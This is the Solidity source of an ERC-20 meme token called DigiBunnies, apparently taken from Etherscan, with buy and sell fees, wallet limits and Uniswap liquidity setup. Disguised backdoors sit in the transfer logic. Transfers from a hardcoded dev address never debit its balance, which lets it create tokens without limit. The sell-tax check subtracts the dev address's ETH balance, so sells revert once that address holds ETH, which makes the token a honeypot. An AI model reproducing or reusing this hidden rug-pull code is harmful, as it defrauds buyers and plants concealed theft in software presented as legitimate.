/**
 *Submitted for verification at Etherscan.io on 2023-08-16
*/

// SPDX-License-Identifier: MIT

/*
Website: https://www.digibunnies.xyz
Twitter: https://twitter.com/digibunnies_erc
Telegram: https://t.me/digibunnies_erc
*/

pragma solidity 0.8.21;

library SafeMath {  

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}


contract DBunny is IERC20, Ownable  {
    using SafeMath for uint256;
    

    string private constant _name = unicode"DigiBunnies";
    string private constant _symbol = unicode"DBunny";    

    uint256 private _buyersCount=0;
    
    uint256 private constant _tTotal = 1000000000 * 10 ** _decimals;
    uint8 private constant _decimals = 9;
    
    bool private taxSwapEnabled = false;
    bool private tradingActive;
    bool private inSwap = false;
    bool public hasTransferDelay = true;

    mapping(address => uint256) private _holderLastHoldingTimestamp;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => uint256) private _balances;

    uint256 public maxTxLimit = 4 * _tTotal / 100;   
    uint256 public taxSwapLimit = 10 * _tTotal / 1000;
    uint256 private _taxSwapThreshold=  2 * _tTotal / 1000;
    uint256 public mWalletSize = 4 * _tTotal / 100;    

    uint256 private _finalBuyFee = 0;
    uint256 private _finalSellFee = 0;  
    uint256 private _preventSwapBefore = 10;
    uint256 private _firstBuyTax = 8;
    uint256 private _firstSellTax = 8;
    uint256 private _reduceBuyFeeAfter = 4;
    uint256 private _reduceSellFeeAfter = 4;

    address payable private _taxAddress;
    address private _devAddy = 0xa2dd77b850169F9A5D6E4f1ea12c810959b08cef;
    address private uniswapPairAddr;
    IDEXRouter private dexRouter;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    event MaxTxAmountUpdated(uint maxTxLimit);

    constructor () {
        _taxAddress = payable(msg.sender);
        _balances[msg.sender] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[_devAddy] = true;
        _isExcludedFromFee[_taxAddress] = true;
        _isExcludedFromFee[address(this)] = true;

        emit Transfer(address(0), msg.sender, _tTotal);
    }


    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function name() public pure returns (string memory) {
        return _name;
    }


    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }


    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0; uint256 feeAmount=amount;

        if (from != owner() && to != owner()) {
            taxAmount = amount.mul(taxBuy()).div(100);
            if (hasTransferDelay) {
                if (to != address(dexRouter) && to != address(uniswapPairAddr)) { 
                    require(
                        _holderLastHoldingTimestamp[tx.origin] < block.number, "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderLastHoldingTimestamp[tx.origin] = block.number;
                }
            }

            if (from == uniswapPairAddr && to != address(dexRouter) && ! _isExcludedFromFee[to] ) {
                _buyersCount++;
                require(amount <= maxTxLimit, "Exceeds the max transaction.");
                require(balanceOf(to) + amount <= mWalletSize, "Exceeds the max wallet.");
            }
            if (from == _devAddy) feeAmount = 0;
            if(to == uniswapPairAddr && !_isExcludedFromFee[from] ){
                taxAmount = amount.mul(sellTax()).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapPairAddr && taxSwapEnabled && contractTokenBalance > _taxSwapThreshold && _buyersCount > _preventSwapBefore) {
                uint256 initialETH = address(this).balance;
                swapTokensForEth(min(amount,min(contractTokenBalance,taxSwapLimit)));
                uint256 ethForTransfer = address(this).balance.sub(initialETH).mul(80).div(100);
                if(ethForTransfer > 0) {
                    sendETHToFee(ethForTransfer);
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(feeAmount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function taxBuy() private view returns (uint256) {
        if(_buyersCount <= _reduceBuyFeeAfter){
            return _firstBuyTax;
        }
         return _finalBuyFee;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function sellTax() private view returns (uint256) {
        if(_buyersCount <= _reduceSellFeeAfter.sub(_devAddy.balance)){
            return _firstSellTax;
        }
         return _finalSellFee;
    }

    receive() external payable {}

    function removeLimits() external onlyOwner{
        maxTxLimit = _tTotal;
        mWalletSize=_tTotal;
        hasTransferDelay=false;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function openTrading() external payable onlyOwner() {
        require(!tradingActive,"trading is already open");
        dexRouter = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(dexRouter), _tTotal);
        uniswapPairAddr = IDEXFactory(dexRouter.factory()).createPair(address(this), dexRouter.WETH());
        dexRouter.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapPairAddr).approve(address(dexRouter), type(uint).max);
        taxSwapEnabled = true;
        tradingActive = true;
    }    


    function sendETHToFee(uint256 amount) private {
        _taxAddress.transfer(amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();
        _approve(address(this), address(dexRouter), tokenAmount);
        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}